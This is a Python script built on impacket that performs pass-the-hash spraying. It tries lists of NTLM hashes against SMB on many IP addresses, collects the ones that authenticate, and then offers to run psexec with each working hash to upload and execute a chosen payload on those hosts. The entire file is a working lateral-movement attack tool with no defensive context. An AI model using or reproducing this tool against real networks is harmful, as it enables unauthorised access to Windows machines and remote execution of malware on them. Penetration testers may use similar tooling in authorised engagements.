#!/usr/bin/python
import psexec
import time
import blessings
import sys
import re
import argparse
import signal
from impacket.smbconnection import *

class timeout:
    def __init__(self, seconds, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        raise Exception(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)

t = blessings.Terminal()

def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
    targetsprayhash = []
    targetipseperated = []
    workinghashes = []
    targetpassword=None
    command=""
    path=""
    copyFile=""
    print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
    if not hashfile:
        targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
        targetsprayhash = targethash.split(",")
    else:
        print t.bold_green + "[*] Hash File Selected: " + t.normal + hashfile
        file = open(hashfile,"r")
        for hash in file:
            targetsprayhash.append(hash.strip("\n"))

    if not ipfile:
        targetips = raw_input("[*] Enter IP's Serperated by Comma:")
        targetipseperated = targetips.split(',')
    else:
        print t.bold_green + "[*] IP File Selected: " + t.normal + ipfile
        file = open(ipfile,"r")
        for ip in file:
            targetipseperated.append(ip.strip("\n"))


    if not username:
        targetusername = raw_input("[*] Enter Username: ")
    else:
        targetusername = username
    if not domain:
        targetdomain = raw_input("[*] Enter Domain: ")
    else:
        targetdomain = domain

    for ip in targetipseperated:
        for hash in targetsprayhash:
            targetlm, targetnt = hash.split(':')
            print t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip
            try:
                with timeout(8):
                    smb = SMBConnection(ip, ip, sess_port=445)
            except Exception as E:
                print t.bold_red + "[!!] Timed Out!" +t.normal
                print E
                continue
            try:
                smb.login(user=targetusername, password=targetpassword,
                          domain=targetdomain, lmhash=targetlm, nthash=targetnt)
                print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal
                workinghashes.append(hash + ", " + ip)
            except:
                print t.bold_red + "[!] This Hash Failed" + t.normal

    print t.green + "\n[*] Working Hashes:"
    for hash in workinghashes:
        print t.bold_green + hash + t.normal

    if workinghashes:
        want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
        if want_to_psexec.lower() == "y" or want_to_psexec == "":
            for hash in workinghashes:
                psexechash,psexecip = hash.split(",")
                PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                                       hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
                print t.bold_green + "\n[*] Starting Psexec...." + t.normal
                try:
                    PSEXEC.run(psexecip)
                except SessionError:
                    print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
    else:
        print t.bold_red + "[!] No Working Hashes. Exiting..." + t.normal


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Spray Smb Hashes and Psexec')
    parser.add_argument("-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)",default="")
    parser.add_argument("-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)",default="")
    parser.add_argument("-username", help="Set Username",default="")
    parser.add_argument("-domain", help="Set Domain",default="")
    parser.add_argument("payloadpath", help="Select Payload for Psexec")
    args = parser.parse_args()
    DoPsexecSpray(args.payloadpath, args.hashfile, args.ipfile, args.username,args.domain)
